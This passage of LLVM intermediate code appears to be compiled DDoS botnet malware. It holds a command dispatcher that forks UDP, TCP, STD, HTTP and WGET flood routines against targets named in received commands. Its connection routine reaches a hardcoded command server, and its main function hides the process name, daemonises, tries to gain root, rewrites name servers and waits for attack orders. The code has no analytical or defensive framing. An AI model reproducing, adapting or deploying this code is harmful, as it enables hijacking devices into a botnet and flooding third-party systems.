  tail call void @SendHTTPTXT(i8* %146, i8* %148, i16 zeroext %151, i8* undef, i32 %153, i32 %156)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:157:                                    ; preds = %126
  %158 = tail call i32 @strcmp(i8* %62, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.190, i64 0, i64 0)) #14
  %159 = icmp eq i32 %158, 0
  br i1 %159, label %160, label %.loopexit169

; <label>:160:                                    ; preds = %157
  %161 = icmp slt i32 %0, 3
  br i1 %161, label %342, label %162

; <label>:162:                                    ; preds = %160
  %163 = getelementptr inbounds i8*, i8** %1, i64 2
  %164 = load i8*, i8** %163, align 8
  %165 = tail call i32 @atoi(i8* %164) #14
  %166 = icmp slt i32 %165, 1
  br i1 %166, label %342, label %167

; <label>:167:                                    ; preds = %162
  %168 = getelementptr inbounds i8*, i8** %1, i64 1
  %169 = load i8*, i8** %168, align 8
  %strchr = tail call i8* @strchr(i8* %169, i32 44)
  %170 = icmp eq i8* %strchr, null
  br i1 %170, label %178, label %.preheader168.preheader

.preheader168.preheader:                          ; preds = %167
  br label %.preheader168

.preheader168:                                    ; preds = %.preheader168.preheader, %173
  %.sink = phi i8* [ null, %173 ], [ %169, %.preheader168.preheader ]
  %171 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i64 0, i64 0)) #7
  %172 = icmp eq i8* %171, null
  br i1 %172, label %.loopexit169.loopexit, label %173

; <label>:173:                                    ; preds = %.preheader168
  %174 = tail call i32 @listFork()
  %175 = icmp eq i32 %174, 0
  br i1 %175, label %.preheader167.preheader, label %.preheader168

.preheader167.preheader:                          ; preds = %173
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  %176 = load i32, i32* @mainCommSock, align 4
  %177 = tail call i32 @close(i32 %176) #7
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:178:                                    ; preds = %167
  %179 = tail call i32 @listFork()
  %180 = icmp eq i32 %179, 0
  br i1 %180, label %.preheader.preheader, label %342

.preheader.preheader:                             ; preds = %178
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  tail call void @SendWGET(i8* %169, i32 %165)
  %181 = load i32, i32* @mainCommSock, align 4
  %182 = tail call i32 @close(i32 %181) #7
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit169.loopexit:                            ; preds = %.preheader168
  %.pre185 = load i8*, i8** %1, align 8
  br label %.loopexit169

.loopexit169:                                     ; preds = %.loopexit169.loopexit, %157
  %183 = phi i8* [ %.pre185, %.loopexit169.loopexit ], [ %62, %157 ]
  %184 = tail call i32 @strcmp(i8* %183, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.191, i64 0, i64 0)) #14
  %185 = icmp eq i32 %184, 0
  br i1 %185, label %186, label %.loopexit166

; <label>:186:                                    ; preds = %.loopexit169
  %187 = icmp slt i32 %0, 6
  br i1 %187, label %342, label %188

; <label>:188:                                    ; preds = %186
  %189 = getelementptr inbounds i8*, i8** %1, i64 3
  %190 = load i8*, i8** %189, align 8
  %191 = tail call i32 @atoi(i8* %190) #14
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %342, label %193

; <label>:193:                                    ; preds = %188
  %194 = getelementptr inbounds i8*, i8** %1, i64 2
  %195 = load i8*, i8** %194, align 8
  %196 = tail call i32 @atoi(i8* %195) #14
  %197 = icmp eq i32 %196, -1
  br i1 %197, label %342, label %198

; <label>:198:                                    ; preds = %193
  %199 = getelementptr inbounds i8*, i8** %1, i64 4
  %200 = load i8*, i8** %199, align 8
  %201 = tail call i32 @atoi(i8* %200) #14
  %202 = icmp eq i32 %201, -1
  %203 = icmp sgt i32 %201, 1024
  %or.cond = or i1 %202, %203
  br i1 %or.cond, label %342, label %204

; <label>:204:                                    ; preds = %198
  %205 = icmp eq i32 %0, 6
  br i1 %205, label %206, label %211

; <label>:206:                                    ; preds = %204
  %207 = getelementptr inbounds i8*, i8** %1, i64 5
  %208 = load i8*, i8** %207, align 8
  %209 = tail call i32 @atoi(i8* %208) #14
  %210 = icmp slt i32 %209, 1
  br i1 %210, label %342, label %211

; <label>:211:                                    ; preds = %206, %204
  %212 = getelementptr inbounds i8*, i8** %1, i64 1
  %213 = load i8*, i8** %212, align 8
  %214 = tail call i32 @atoi(i8* %195) #14
  %215 = tail call i32 @atoi(i8* %190) #14
  %216 = tail call i32 @atoi(i8* %200) #14
  br i1 %205, label %217, label %221

; <label>:217:                                    ; preds = %211
  %218 = getelementptr inbounds i8*, i8** %1, i64 5
  %219 = load i8*, i8** %218, align 8
  %220 = tail call i32 @atoi(i8* %219) #14
  br label %221

; <label>:221:                                    ; preds = %211, %217
  %222 = phi i32 [ %220, %217 ], [ 10, %211 ]
  %strchr154 = tail call i8* @strchr(i8* %213, i32 44)
  %223 = icmp eq i8* %strchr154, null
  br i1 %223, label %230, label %.preheader165.preheader

.preheader165.preheader:                          ; preds = %221
  br label %.preheader165

.preheader165:                                    ; preds = %.preheader165.preheader, %226
  %.sink157 = phi i8* [ null, %226 ], [ %213, %.preheader165.preheader ]
  %224 = tail call i8* @strtok(i8* %.sink157, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i64 0, i64 0)) #7
  %225 = icmp eq i8* %224, null
  br i1 %225, label %.loopexit166.loopexit, label %226

; <label>:226:                                    ; preds = %.preheader165
  %227 = tail call i32 @listFork()
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %.preheader165

; <label>:229:                                    ; preds = %226
  tail call void @SendUDP(i8* nonnull %224, i32 %214, i32 %215, i32 %216, i32 %222, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:230:                                    ; preds = %221
  %231 = tail call i32 @listFork()
  %232 = icmp eq i32 %231, 0
  br i1 %232, label %233, label %342

; <label>:233:                                    ; preds = %230
  tail call void @SendUDP(i8* %213, i32 %214, i32 %215, i32 %216, i32 %222, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit166.loopexit:                            ; preds = %.preheader165
  %.pre186 = load i8*, i8** %1, align 8
  br label %.loopexit166

.loopexit166:                                     ; preds = %.loopexit166.loopexit, %.loopexit169
  %234 = phi i8* [ %.pre186, %.loopexit166.loopexit ], [ %183, %.loopexit169 ]
  %235 = tail call i32 @strcmp(i8* %234, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.192, i64 0, i64 0)) #14
  %236 = icmp eq i32 %235, 0
  br i1 %236, label %237, label %.loopexit164

; <label>:237:                                    ; preds = %.loopexit166
  %238 = icmp slt i32 %0, 6
  br i1 %238, label %342, label %239

; <label>:239:                                    ; preds = %237
  %240 = getelementptr inbounds i8*, i8** %1, i64 3
  %241 = load i8*, i8** %240, align 8
  %242 = tail call i32 @atoi(i8* %241) #14
  %243 = icmp eq i32 %242, -1
  br i1 %243, label %342, label %244

; <label>:244:                                    ; preds = %239
  %245 = getelementptr inbounds i8*, i8** %1, i64 2
  %246 = load i8*, i8** %245, align 8
  %247 = tail call i32 @atoi(i8* %246) #14
  %248 = icmp eq i32 %247, -1
  br i1 %248, label %342, label %249

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds i8*, i8** %1, i64 5
  %251 = load i8*, i8** %250, align 8
  %252 = tail call i32 @atoi(i8* %251) #14
  %253 = icmp slt i32 %252, 0
  br i1 %253, label %342, label %254

; <label>:254:                                    ; preds = %249
  %255 = icmp eq i32 %0, 7
  br i1 %255, label %256, label %261

; <label>:256:                                    ; preds = %254
  %257 = getelementptr inbounds i8*, i8** %1, i64 6
  %258 = load i8*, i8** %257, align 8
  %259 = tail call i32 @atoi(i8* %258) #14
  %260 = icmp slt i32 %259, 1
  br i1 %260, label %342, label %261

; <label>:261:                                    ; preds = %256, %254
  %262 = getelementptr inbounds i8*, i8** %1, i64 1
  %263 = load i8*, i8** %262, align 8
  %264 = tail call i32 @atoi(i8* %246) #14
  %265 = tail call i32 @atoi(i8* %241) #14
  %266 = getelementptr inbounds i8*, i8** %1, i64 4
  %267 = load i8*, i8** %266, align 8
  br i1 %255, label %268, label %272

; <label>:268:                                    ; preds = %261
  %269 = getelementptr inbounds i8*, i8** %1, i64 6
  %270 = load i8*, i8** %269, align 8
  %271 = tail call i32 @atoi(i8* %270) #14
  br label %272

; <label>:272:                                    ; preds = %261, %268
  %273 = phi i32 [ %271, %268 ], [ 10, %261 ]
  %274 = tail call i32 @atoi(i8* %251) #14
  %strchr155 = tail call i8* @strchr(i8* %263, i32 44)
  %275 = icmp eq i8* %strchr155, null
  br i1 %275, label %282, label %.preheader163.preheader

.preheader163.preheader:                          ; preds = %272
  br label %.preheader163

.preheader163:                                    ; preds = %.preheader163.preheader, %278
  %.sink158 = phi i8* [ null, %278 ], [ %263, %.preheader163.preheader ]
  %276 = tail call i8* @strtok(i8* %.sink158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i64 0, i64 0)) #7
  %277 = icmp eq i8* %276, null
  br i1 %277, label %.loopexit164.loopexit, label %278

; <label>:278:                                    ; preds = %.preheader163
  %279 = tail call i32 @listFork()
  %280 = icmp eq i32 %279, 0
  br i1 %280, label %281, label %.preheader163

; <label>:281:                                    ; preds = %278
  tail call void @SendTCP(i8* nonnull %276, i32 %264, i32 %265, i8* %267, i32 %274, i32 %273, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:282:                                    ; preds = %272
  %283 = tail call i32 @listFork()
  %284 = icmp eq i32 %283, 0
  br i1 %284, label %285, label %342

; <label>:285:                                    ; preds = %282
  tail call void @SendTCP(i8* %263, i32 %264, i32 %265, i8* %267, i32 %274, i32 %273, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit164.loopexit:                            ; preds = %.preheader163
  %.pre187 = load i8*, i8** %1, align 8
  br label %.loopexit164

.loopexit164:                                     ; preds = %.loopexit164.loopexit, %.loopexit166
  %286 = phi i8* [ %.pre187, %.loopexit164.loopexit ], [ %234, %.loopexit166 ]
  %287 = tail call i32 @strcmp(i8* %286, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.193, i64 0, i64 0)) #14
  %288 = icmp eq i32 %287, 0
  br i1 %288, label %289, label %.loopexit162

; <label>:289:                                    ; preds = %.loopexit164
  %290 = icmp slt i32 %0, 4
  br i1 %290, label %342, label %291

; <label>:291:                                    ; preds = %289
  %292 = getelementptr inbounds i8*, i8** %1, i64 2
  %293 = load i8*, i8** %292, align 8
  %294 = tail call i32 @atoi(i8* %293) #14
  %295 = icmp slt i32 %294, 1
  br i1 %295, label %342, label %296

; <label>:296:                                    ; preds = %291
  %297 = getelementptr inbounds i8*, i8** %1, i64 3
  %298 = load i8*, i8** %297, align 8
  %299 = tail call i32 @atoi(i8* %298) #14
  %300 = icmp slt i32 %299, 1
  br i1 %300, label %342, label %301

; <label>:301:                                    ; preds = %296
  %302 = getelementptr inbounds i8*, i8** %1, i64 1
  %303 = load i8*, i8** %302, align 8
  %strchr156 = tail call i8* @strchr(i8* %303, i32 44)
  %304 = icmp eq i8* %strchr156, null
  br i1 %304, label %311, label %.preheader161.preheader

.preheader161.preheader:                          ; preds = %301
  br label %.preheader161

.preheader161:                                    ; preds = %.preheader161.preheader, %307
  %.sink159 = phi i8* [ null, %307 ], [ %303, %.preheader161.preheader ]
  %305 = tail call i8* @strtok(i8* %.sink159, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i64 0, i64 0)) #7
  %306 = icmp eq i8* %305, null
  br i1 %306, label %.loopexit162.loopexit, label %307

; <label>:307:                                    ; preds = %.preheader161
  %308 = tail call i32 @listFork()
  %309 = icmp eq i32 %308, 0
  br i1 %309, label %310, label %.preheader161

; <label>:310:                                    ; preds = %307
  tail call void @SendSTD(i8* nonnull %305, i32 %294, i32 %299)
  unreachable

; <label>:311:                                    ; preds = %301
  %312 = tail call i32 @listFork()
  %313 = icmp eq i32 %312, 0
  br i1 %313, label %314, label %342

; <label>:314:                                    ; preds = %311
  tail call void @SendSTD(i8* %303, i32 %294, i32 %299)
  unreachable

.loopexit162.loopexit:                            ; preds = %.preheader161
  %.pre188 = load i8*, i8** %1, align 8
  br label %.loopexit162

.loopexit162:                                     ; preds = %.loopexit162.loopexit, %.loopexit164
  %315 = phi i8* [ %.pre188, %.loopexit162.loopexit ], [ %286, %.loopexit164 ]
  %316 = tail call i32 @strcmp(i8* %315, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.194, i64 0, i64 0)) #14
  %317 = icmp eq i32 %316, 0
  %318 = load i64, i64* @numpids, align 8
  %319 = icmp ne i64 %318, 0
  %or.cond178 = and i1 %317, %319
  br i1 %or.cond178, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit162
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %332
  %.0175 = phi i64 [ %333, %332 ], [ 0, %.lr.ph.preheader ]
  %320 = load i32*, i32** @pids, align 8
  %321 = getelementptr inbounds i32, i32* %320, i64 %.0175
  %322 = load i32, i32* %321, align 4
  %323 = icmp eq i32 %322, 0
  br i1 %323, label %332, label %324

; <label>:324:                                    ; preds = %.lr.ph
  %325 = tail call i32 @getpid() #7
  %326 = icmp eq i32 %322, %325
  br i1 %326, label %332, label %327

; <label>:327:                                    ; preds = %324
  %328 = load i32*, i32** @pids, align 8
  %329 = getelementptr inbounds i32, i32* %328, i64 %.0175
  %330 = load i32, i32* %329, align 4
  %331 = tail call i32 @kill(i32 %330, i32 9) #7
  br label %332

; <label>:332:                                    ; preds = %324, %.lr.ph, %327
  %333 = add i64 %.0175, 1
  %334 = load i64, i64* @numpids, align 8
  %335 = icmp ult i64 %333, %334
  br i1 %335, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %332
  %.pre189 = load i8*, i8** %1, align 8
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit162
  %336 = phi i8* [ %.pre189, %.loopexit.loopexit ], [ %315, %.loopexit162 ]
  %337 = tail call i32 @strcmp(i8* %336, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.195, i64 0, i64 0)) #14
  %338 = icmp eq i32 %337, 0
  br i1 %338, label %339, label %342

; <label>:339:                                    ; preds = %.loopexit
  tail call void @CleanDevice()
  %340 = load i32, i32* @mainCommSock, align 4
  %341 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %340, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.196, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.53, i64 0, i64 0), i32 ptrtoint ([14 x i8]* @.str.200 to i32))
  br label %342

; <label>:342:                                    ; preds = %.loopexit, %311, %282, %230, %178, %141, %110, %77, %51, %2, %289, %291, %296, %237, %239, %244, %249, %256, %186, %188, %193, %198, %206, %160, %162, %129, %131, %136, %98, %100, %105, %65, %67, %72, %42, %339, %21
  ret void
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #6

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @getEndianness() local_unnamed_addr #0 {
  ret i32 ptrtoint ([14 x i8]* @.str.200 to i32)
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #2 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #7
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #7
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #14
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 23, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() local_unnamed_addr #2 {
  %1 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.197, i64 0, i64 0), i32 513) #7
  %2 = tail call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.197, i64 0, i64 0), i32 0) #7
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %8, label %4

; <label>:4:                                      ; preds = %0
  %5 = and i32 %1, 65535
  %6 = tail call i64 @write(i32 %5, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.198, i64 0, i64 0), i64 38) #7
  %7 = tail call i32 @close(i32 %5) #7
  br label %8

; <label>:8:                                      ; preds = %0, %4
  ret void
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @access(i8* nocapture readonly, i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #2 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [10 x i8*], align 16
  %6 = load i8*, i8** %1, align 8
  %7 = tail call i64 @strlen(i8* %6) #14
  tail call void @llvm.memset.p0i8.i64(i8* %6, i8 0, i64 %7, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i64 0, i64 0), i8** %1, align 8
  %8 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.204 to i64), i32 0, i32 0, i32 0) #7
  %9 = tail call i64 @time(i64* null) #7
  %10 = tail call i32 @getpid() #7
  %11 = zext i32 %10 to i64
  %12 = xor i64 %11, %9
  %13 = trunc i64 %12 to i32
  tail call void @srand(i32 %13) #7
  %14 = tail call i64 @time(i64* null) #7
  %15 = tail call i32 @getpid() #7
  %16 = zext i32 %15 to i64
  %17 = xor i64 %16, %14
  %18 = trunc i64 %17 to i32
  tail call void @init_rand(i32 %18)
  %19 = tail call i32 @fork() #7
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %23, label %21

; <label>:21:                                     ; preds = %2
  %22 = call i32 @waitpid(i32 %19, i32* nonnull %3, i32 0) #7
  call void @exit(i32 0) #16
  unreachable

; <label>:23:                                     ; preds = %2
  %24 = tail call i32 @fork() #7
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %27, label %26

; <label>:26:                                     ; preds = %23
  tail call void @exit(i32 0) #16
  unreachable

; <label>:27:                                     ; preds = %23
  %28 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i64 0, i64 0)) #7
  %29 = tail call i32 @setuid(i32 0) #7
  %30 = tail call i32 @seteuid(i32 0) #7
  %31 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %32 = tail call i32 @fork() #7
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %.lr.ph107.preheader, label %.loopexit78

.lr.ph107.preheader:                              ; preds = %27
  br label %.lr.ph107

.lr.ph107:                                        ; preds = %.lr.ph107.preheader, %36
  %34 = tail call i32 @initConnection()
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %40, label %36

; <label>:36:                                     ; preds = %.lr.ph107
  %37 = tail call i32 @sleep(i32 5) #7
  %38 = tail call i32 @fork() #7
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %.lr.ph107, label %.loopexit78.loopexit126

; <label>:40:                                     ; preds = %.lr.ph107
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %41, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.206, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.53, i64 0, i64 0), i32 ptrtoint ([14 x i8]* @.str.200 to i32))
  tail call void @UpdateNameSrvs()
  tail call void @CleanDevice()
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %45 = call i32 @recvLine(i32 %43, i8* nonnull %44, i32 4096)
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %.loopexit78, label %.preheader77.lr.ph

.preheader77.lr.ph:                               ; preds = %40
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %48 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 0
  br label %.preheader77

.preheader77:                                     ; preds = %.preheader77.lr.ph, %.backedge
  %49 = phi i32 [ %45, %.preheader77.lr.ph ], [ %96, %.backedge ]
  %50 = load i64, i64* @numpids, align 8
  %51 = icmp eq i64 %50, 0
  br i1 %51, label %._crit_edge93, label %.lr.ph92.preheader

.lr.ph92.preheader:                               ; preds = %.preheader77
  br label %.lr.ph92

.lr.ph92:                                         ; preds = %.lr.ph92.preheader, %.lr.ph92._crit_edge
  %indvars.iv = phi i64 [ %57, %.lr.ph92._crit_edge ], [ 0, %.lr.ph92.preheader ]
  %52 = load i32*, i32** @pids, align 8
  %53 = getelementptr inbounds i32, i32* %52, i64 %indvars.iv
  %54 = load i32, i32* %53, align 4
  %55 = call i32 @waitpid(i32 %54, i32* null, i32 1) #7
  %56 = icmp sgt i32 %55, 0
  %57 = add nuw i64 %indvars.iv, 1
  br i1 %56, label %.preheader, label %.lr.ph92._crit_edge

.preheader:                                       ; preds = %.lr.ph92
  %58 = load i64, i64* @numpids, align 8
  %59 = icmp ult i64 %57, %58
  %60 = load i32*, i32** @pids, align 8
  %61 = trunc i64 %indvars.iv to i32
  br i1 %59, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %62 = trunc i64 %57 to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32* [ %72, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = phi i64 [ %69, %.lr.ph ], [ %57, %.lr.ph.preheader ]
  %.06584 = phi i32 [ %.065, %.lr.ph ], [ %62, %.lr.ph.preheader ]
  %.065.in83 = phi i32 [ %.06584, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %65 = getelementptr inbounds i32, i32* %63, i64 %64
  %66 = load i32, i32* %65, align 4
  %67 = zext i32 %.065.in83 to i64
  %68 = getelementptr inbounds i32, i32* %63, i64 %67
  store i32 %66, i32* %68, align 4
  %.065 = add i32 %.06584, 1
  %69 = zext i32 %.065 to i64
  %70 = load i64, i64* @numpids, align 8
  %71 = icmp ult i64 %69, %70
  %72 = load i32*, i32** @pids, align 8
  br i1 %71, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.065.in.lcssa = phi i32 [ %61, %.preheader ], [ %.06584, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %60, %.preheader ], [ %72, %._crit_edge.loopexit ]
  %73 = zext i32 %.065.in.lcssa to i64
  %74 = getelementptr inbounds i32, i32* %.lcssa, i64 %73
  store i32 0, i32* %74, align 4
  %75 = load i64, i64* @numpids, align 8
  %76 = add i64 %75, -1
  store i64 %76, i64* @numpids, align 8
  %77 = shl i64 %75, 2
  %78 = call noalias i8* @malloc(i64 %77) #7
  %79 = bitcast i8* %78 to i32*
  %80 = icmp eq i64 %76, 0
  %81 = load i32*, i32** @pids, align 8
  br i1 %80, label %._crit_edge89, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88.preheader, %.lr.ph88
  %82 = phi i64 [ %87, %.lr.ph88 ], [ 0, %.lr.ph88.preheader ]
  %.16686 = phi i32 [ %86, %.lr.ph88 ], [ 0, %.lr.ph88.preheader ]
  %83 = getelementptr inbounds i32, i32* %81, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = getelementptr inbounds i32, i32* %79, i64 %82
  store i32 %84, i32* %85, align 4
  %86 = add i32 %.16686, 1
  %87 = zext i32 %86 to i64
  %88 = icmp ult i64 %87, %76
  br i1 %88, label %.lr.ph88, label %._crit_edge89.loopexit

._crit_edge89.loopexit:                           ; preds = %.lr.ph88
  br label %._crit_edge89

._crit_edge89:                                    ; preds = %._crit_edge89.loopexit, %._crit_edge
  %89 = bitcast i32* %81 to i8*
  call void @free(i8* %89) #7
  store i8* %78, i8** bitcast (i32** @pids to i8**), align 8
  br label %.lr.ph92._crit_edge

.lr.ph92._crit_edge:                              ; preds = %.lr.ph92, %._crit_edge89
  %sext = shl i64 %57, 32
  %90 = ashr exact i64 %sext, 32
  %91 = load i64, i64* @numpids, align 8
  %92 = icmp ult i64 %90, %91
  br i1 %92, label %.lr.ph92, label %._crit_edge93.loopexit

._crit_edge93.loopexit:                           ; preds = %.lr.ph92._crit_edge
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %._crit_edge93.loopexit, %.preheader77
  %93 = sext i32 %49 to i64
  %94 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %93
  store i8 0, i8* %94, align 1
  call void @trim(i8* nonnull %44)
  %strncmp = call i32 @strncmp(i8* nonnull %44, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.181, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %.backedge, label %98

.backedge.loopexit:                               ; preds = %.lr.ph105
  br label %.backedge

.backedge.loopexit125:                            ; preds = %.preheader108
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit125, %.backedge.loopexit, %._crit_edge102.thread, %._crit_edge93, %._crit_edge102, %100
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 @recvLine(i32 %95, i8* nonnull %44, i32 4096)
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %.loopexit78.loopexit, label %.preheader77

; <label>:98:                                     ; preds = %._crit_edge93
  %strncmp69 = call i32 @strncmp(i8* nonnull %44, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.207, i64 0, i64 0), i64 3)
  %cmp70 = icmp eq i32 %strncmp69, 0
  br i1 %cmp70, label %99, label %100

; <label>:99:                                     ; preds = %98
  call void @exit(i32 0) #16
  unreachable

; <label>:100:                                    ; preds = %98
  %101 = load i8, i8* %44, align 16
  %102 = icmp eq i8 %101, 33
  br i1 %102, label %.preheader108.preheader, label %.backedge

.preheader108.preheader:                          ; preds = %100
  br label %.preheader108

.preheader108:                                    ; preds = %.preheader108.preheader, %104
  %.063 = phi i8* [ %105, %104 ], [ %47, %.preheader108.preheader ]
  %103 = load i8, i8* %.063, align 1
  switch i8 %103, label %104 [
    i8 0, label %.backedge.loopexit125
    i8 32, label %106
  ]

; <label>:104:                                    ; preds = %.preheader108
  %105 = getelementptr inbounds i8, i8* %.063, i64 1
  br label %.preheader108

; <label>:106:                                    ; preds = %.preheader108
  store i8 0, i8* %.063, align 1
  %107 = call i64 @strlen(i8* %47) #14
  %108 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %107
  %109 = getelementptr inbounds i8, i8* %108, i64 2
  br label %110

; <label>:110:                                    ; preds = %115, %106
  %111 = call i64 @strlen(i8* %109) #14
  %112 = add i64 %111, -1
  %113 = getelementptr inbounds i8, i8* %109, i64 %112
